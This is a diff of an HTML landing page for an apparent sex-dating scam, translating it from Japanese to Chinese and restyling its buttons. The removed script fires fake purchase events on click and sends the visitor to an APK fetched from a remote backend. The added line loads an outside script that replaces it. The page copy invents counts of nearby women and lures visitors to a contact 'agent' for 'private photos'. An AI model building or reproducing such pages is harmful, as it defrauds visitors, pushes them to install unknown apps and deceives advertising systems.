@@ -1,85 +1,32 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>セフレクラブ | 30km圏内で189人の女の子があなたを待っています</title>
-    <meta name="description" content="あなたの10km圏内で、551人の女性会員が待っています！ここは一夜限りの関係専用、友達作りはお断り。今すぐLINEを追加してマッチング開始！">
+    <title>炮友俱乐部 | 30公里范围内有189位女孩在等你</title>
+    <meta name="description" content="你10公里范围内，有551位女性会员在等你！这里是专为一夜情打造的专属平台，交友请绕道。现在就加LINE，开始匹配吧！">
     <link rel="stylesheet" href="css/style.css" tppabs="https://yyffhy.top/aakk19/static/css/style.css">
     
-	
-
-       <script>
-var API_BASE = 'https://url.yuhd320k.site';
-// Facebook Pixel — 动态从后台加载所有像素ID
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-
-// 从后台 API 获取所有像素ID并初始化
-var _site=window.location.origin+window.location.pathname;
-console.log('前端站点(完整路径):',_site,' API:',API_BASE);
-fetch(API_BASE+'/api/pixels?site='+encodeURIComponent(_site))
-.then(function(r){return r.json()})
-.then(function(d){
-  console.log('像素API返回:',JSON.stringify(d));
-  var ids=d.ids||[];
-  if(!ids.length){ console.warn('像素ID列表为空，请前往后台配置。site='+_site+' matched='+(d._user||'none')); return; }
-  console.log('已加载像素ID:',ids); for(var i=0;i<ids.length;i++){ fbq('init',ids[i]); }
-  fbq('track','PageView');
-  // 动态插入 noscript 备用图
-  var ns=document.createElement('div');
-  ns.style.display='none';
-  ns.innerHTML=ids.map(function(id){return '<img height="1" width="1" src="https://www.facebook.com/tr?id='+id+'&ev=PageView&noscript=1"/>'}).join('');
-  document.body.appendChild(ns);
-})
-.catch(function(){
-  console.warn('像素ID获取失败，请检查后台配置');
-});
-</script>
-<!-- End Meta Pixel Code -->
+    
+   <script src="https://api.km624da.site/js/meetu-sdk.js"></script>
 
  
  
 <script>
-// ========== k2 — 动态获取APK下载地址并跳转 ==========
-var _apkUrl = '';
+ 
 async function openLineApp(source) {
-    fbq('track', 'AddToCart');
-    fbq('track', 'Contact');
-    fbq('track', 'Purchase');
-
-    try {
-        if (!_apkUrl) {
-            var r = await fetch(API_BASE + '/api/apk-url?site=' + encodeURIComponent(_site));
-            var d = await r.json();
-            _apkUrl = d.url;
-            console.log('APK API返回:', JSON.stringify(d));
-        }
-        if (_apkUrl) {
-            window.location.href = _apkUrl;
-        } else {
-            alert('获取地址失败，请稍后重试');
-        }
-    } catch (e) {
-        alert('获取地址失败，请稍后重试');
-    }
+    k2();
 }
 </script>
 
-	
+    
   
 </head>
 <body>
     <!-- 头部 -->
     <header class="header">
         <div class="container">
-            <h1 class="logo">💎ご近所シークレット出会い・セフレクラブ💎</h1>
+            <h1 class="logo">💎附近秘密约会·炮友俱乐部💎</h1>
              
         </div>
     </header>
@@ -87,31 +34,34 @@ async function openLineApp(source) {
     <!-- 英雄区 -->
     <section class="hero">
         <div class="container">
-            <div class="hero-badge">🔞 18歳未満利用禁止</div>
-            <h2 class="hero-title">人妻たちが刺激を求めて集まる<br><span class="highlight">完全会員制</span>プラットフォーム</h2>
-            <p class="hero-subtitle">日常では満たされない、上品で少し危ない大人の時間をお楽しみください。</p>
-            <p class="hero-desc">秘密厳守・安心予約。誰にも知られず特別なひとときを。</p>
+            <div class="hero-badge">🔞 禁止18岁以下使用</div>
+            <h2 class="hero-title">人妻们为寻求刺激而聚集<br><span class="highlight">完全会员制</span>平台</h2>
+            <p class="hero-subtitle">日常生活无法满足的，高雅而略带危险的成人时光，敬请享受。</p>
+            <p class="hero-desc">严格保密·安心预约。无人知晓，独享特别时刻。</p>
             <div class="hero-features">
-                <div class="hero-feature">✓ 【完全会員制】厳選された会員様のみが利用できる特別な空間です。</div>
-                <div class="hero-feature">✓ 【秘密厳守】徹底したプライバシー保護で誰にもバレません。</div>
-                <div class="hero-feature">✓ 【安心予約】安全なシステムで、スムーズな大人の出会いを実現。</div>
+                <div class="hero-feature">✓ 【完全会员制】仅限经过严格筛选的会员使用的特别空间。</div>
+                <div class="hero-feature">✓ 【严格保密】彻底保护隐私，绝不泄露。</div>
+                <div class="hero-feature">✓ 【安心预约】安全系统，实现顺畅的成人约会。</div>
             </div>
-            <button class="cta-button pulse" onclick="openLineApp()">
-                <img src="images/line.png" tppabs="https://yyffhy.top/aakk19/static/images/line.png" alt="LINE" class="btn-icon">
-                LINEを追加してセフレを探す
+            <!-- 修改点：按钮背景色改为 Telegram 蓝，图标替换为 Telegram SVG -->
+            <button class="cta-button pulse" onclick="openLineApp()" style="background-color: #0088cc;">
+                <svg viewBox="0 0 24 24" width="24" height="24" fill="white" class="btn-icon">
+                    <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
+                </svg>
+                加LINE，寻找炮友
             </button>
             <div class="hero-stats">
                 <div class="stat-item">
                     <div class="stat-number">200+</div>
-                    <div class="stat-label">近所の女性</div>
+                    <div class="stat-label">附近女性</div>
                 </div>
                 <div class="stat-item">
                     <div class="stat-number">51/8</div>
-                    <div class="stat-label">オンラインマッチング</div>
+                    <div class="stat-label">在线匹配</div>
                 </div>
                 <div class="stat-item">
                     <div class="stat-number">100%</div>
-                    <div class="stat-label">リアル会員</div>
+                    <div class="stat-label">真实会员</div>
                 </div>
             </div>
         </div>
@@ -120,35 +70,35 @@ async function openLineApp(source) {
     <!-- 筛选区 -->
     <section class="filter-section">
         <div class="container">
-            <h3 class="section-title">🎯 理想の相手を選ぶ</h3>
+            <h3 class="section-title">🎯 选择理想对象</h3>
             <div class="filter-group">
-                <div class="filter-label">🎂 年齢の好み</div>
+                <div class="filter-label">🎂 年龄偏好</div>
                 <div class="filter-buttons" id="age-filter">
-                    <button class="filter-btn active" data-filter="all">すべて</button>
-                    <button class="filter-btn" data-filter="18-25">20-25歳</button>
-                    <button class="filter-btn" data-filter="26-35">26-35歳</button>
-                    <button class="filter-btn" data-filter="35+">35歳以上</button>
+                    <button class="filter-btn active" data-filter="all">全部</button>
+                    <button class="filter-btn" data-filter="18-25">20-25岁</button>
+                    <button class="filter-btn" data-filter="26-35">26-35岁</button>
+                    <button class="filter-btn" data-filter="35+">35岁以上</button>
                 </div>
             </div>
 
             <div class="filter-group">
-                <div class="filter-label">✨ スタイル・タイプ</div>
+                <div class="filter-label">✨ 风格·类型</div>
                 <div class="filter-buttons" id="style-filter">
-                    <button class="filter-btn active" data-filter="all">すべて</button>
-                    <button class="filter-btn" data-filter="sweet">キュート・可愛い</button>
-                    <button class="filter-btn" data-filter="sexy">セクシー・色っぽい</button>
-                    <button class="filter-btn" data-filter="pure">清楚・上品</button>
-                    <button class="filter-btn" data-filter="mature">成熟・知的</button>
+                    <button class="filter-btn active" data-filter="all">全部</button>
+                    <button class="filter-btn" data-filter="sweet">可爱·萌系</button>
+                    <button class="filter-btn" data-filter="sexy">性感·妩媚</button>
+                    <button class="filter-btn" data-filter="pure">清纯·高雅</button>
+                    <button class="filter-btn" data-filter="mature">成熟·知性</button>
                 </div>
             </div>
 
             <div class="filter-group">
-                <div class="filter-label">💪 体型のタイプ</div>
+                <div class="filter-label">💪 体型类型</div>
                 <div class="filter-buttons" id="body-filter">
-                    <button class="filter-btn active" data-filter="all">すべて</button>
-                    <button class="filter-btn" data-filter="slim">スリム</button>
-                    <button class="filter-btn" data-filter="curvy">ぽっちゃり・豊満</button>
-                    <button class="filter-btn" data-filter="fit">フィットネス・筋肉質</button>
+                    <button class="filter-btn active" data-filter="all">全部</button>
+                    <button class="filter-btn" data-filter="slim">苗条</button>
+                    <button class="filter-btn" data-filter="curvy">丰满·微胖</button>
+                    <button class="filter-btn" data-filter="fit">健身·肌肉型</button>
                 </div>
             </div>
         </div>
@@ -169,32 +119,35 @@ async function openLineApp(source) {
             <div class="reminder-box">
                 <div class="reminder-icon">💡</div>
                 <div class="reminder-content">
-                    <h4 class="reminder-title">お知らせ</h4>
-                    <p class="reminder-text">毎週プラットフォームには<span class="highlight-text">10〜20人の女性会員</span>が新規登録しています。LINEを追加すれば、必ず好みの女の子が見つかります！</p>
+                    <h4 class="reminder-title">通知</h4>
+                    <p class="reminder-text">每周平台有<span class="highlight-text">10～20位女性会员</span>新注册。加LINE，一定能找到你喜欢的女孩！</p>
                 </div>
             </div>
-            <h3 class="section-title">💬 準備はいいですか？</h3>
-            <p class="contact-desc">専属エージェントを追加して、24時間いつでもマッチング。完全な安全性とプライバシーを保証します。</p>
-            <button class="cta-button large pulse" onclick="openLineApp()">
-                <img src="images/line.png" tppabs="https://yyffhy.top/aakk19/static/images/line.png" alt="LINE" class="btn-icon">
-                今すぐLINEを追加して会う
+            <h3 class="section-title">💬 准备好了吗？</h3>
+            <p class="contact-desc">添加专属经纪人，24小时随时匹配。完全保障安全与隐私。</p>
+            <!-- 修改点：同上，改为 Telegram 风格 -->
+            <button class="cta-button large pulse" onclick="openLineApp()" style="background-color: #0088cc;">
+                <svg viewBox="0 0 24 24" width="24" height="24" fill="white" class="btn-icon">
+                    <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
+                </svg>
+                现在就约起来
             </button>
             <div class="contact-features">
                 <div class="feature-item">
                     <span class="feature-icon">✅</span>
-                    <span>今夜すぐ会える</span>
+                    <span>今晚就能见面</span>
                 </div>
                 <div class="feature-item">
                     <span class="feature-icon">✅</span>
-                    <span>100%本人写真</span>
+                    <span>100%本人照片</span>
                 </div>
                 <div class="feature-item">
                     <span class="feature-icon">✅</span>
-                    <span>秘密厳守</span>
+                    <span>严格保密</span>
                 </div>
                 <div class="feature-item">
                     <span class="feature-icon">✅</span>
-                    <span>後腐れなし</span>
+                    <span>无后顾之忧</span>
                 </div>
             </div>
         </div>
@@ -203,51 +156,52 @@ async function openLineApp(source) {
     <!-- 页脚 -->
     <footer class="footer">
         <div class="container">
-            <p>© 2026 セフレクラブ | 18歳未満利用禁止</p>
+            <p>© 2026 炮友俱乐部 | 禁止18岁以下使用</p>
             <div class="footer-links">
-                <a href="#privacy">プライバシーポリシー</a>
-                <a href="#terms">利用規約</a>
+                <a href="#privacy">隐私政策</a>
+                <a href="#terms">使用条款</a>
             </div>
         </div>
     </footer>
 
-    <!-- 弹窗 -->
+    <!-- 弹窗（未修改，保持原样） -->
     <div class="success-modal" id="successModal">
         <div class="modal-overlay" onclick="closeModal()"></div>
         <div class="modal-container">
             <div class="modal-header">
-                <h2 class="modal-title">🎉 おめでとうございます！</h2>
+                <h2 class="modal-title">🎉 恭喜您！</h2>
                 <button class="modal-close-btn" onclick="closeModal()">×</button>
             </div>
             <div class="modal-body">
-                <p class="modal-subtitle">当クラブへの入会資格を獲得しました</p>
+                <p class="modal-subtitle">您已获得本俱乐部的入会资格</p>
                 <div class="result-box">
-                    <p class="result-text">あなたの近くに<span class="highlight-number">89人の女性会員</span>がいます</p>
+                    <p class="result-text">您附近有<span class="highlight-number">89位女性会员</span></p>
                 </div>
-                <p class="modal-desc">まもなく近所の女性の連絡先を取得できます。下のボタンをクリックして美人エージェントを追加し、好みの女の子を選んですぐに会いましょう。</p>
+                <p class="modal-desc">很快您就能获取附近女性的联系方式。点击下方按钮添加美女经纪人，选择您喜欢的女孩，立刻见面吧。</p>
                 <div class="instructions">
                     <div class="instruction-item">
                         <span class="step-number">1.</span>
-                        <span class="step-text">すぐに美人エージェントを追加し、「台北」などお住まいの地域を返信してください。すぐに近くの美女を手配します！</span>
+                        <span class="step-text">立即添加美女经纪人，回复您所在的城市（如“台北”），马上为您安排附近的美女！</span>
                     </div>
                     <div class="instruction-item">
                         <span class="step-number">2.</span>
-                        <span class="step-text">【女の子を選ぶ】と返信すると、女の子の連絡先と会うための詳細がロック解除されます。</span>
+                        <span class="step-text">回复“选女孩”，即可解锁女孩的联系方式和见面详情。</span>
                     </div>
                     <div class="instruction-item">
                         <span class="step-number">3.</span>
-                        <span class="step-text">【裏メニュー】と入力すると、さらにディープな遊び方とシークレット会員特典を獲得できます！</span>
+                        <span class="step-text">输入“隐藏菜单”，即可获得更深层次的玩法和秘密会员特权！</span>
                     </div>
                     <div class="instruction-item">
                         <span class="step-number">4.</span>
-                        <span class="step-text">エージェントに直接メッセージを送ると、彼女たちの「プライベート写真」や詳しいプロフィールをゲットできます〜</span>
+                        <span class="step-text">直接给经纪人发消息，还能获取她们的“私密照片”和详细资料哦～</span>
                     </div>
                 </div>
 
-                <p class="final-text">今すぐ彼女たちの連絡先をゲットする：</p>
+                <p class="final-text">立即获取她们的联系方式：</p>
+                <!-- 此按钮未修改（保持原样，因为用户未要求） -->
                 <button class="line-button" onclick="openLineApp()">
                     <img src="images/line.png" tppabs="https://yyffhy.top/aakk19/static/images/line.png" alt="LINE" class="line-btn-icon">
-                    <span>今すぐセフレを探す</span>
+                    <span>立刻寻找炮友</span>
                 </button>
             </div>
         </div>
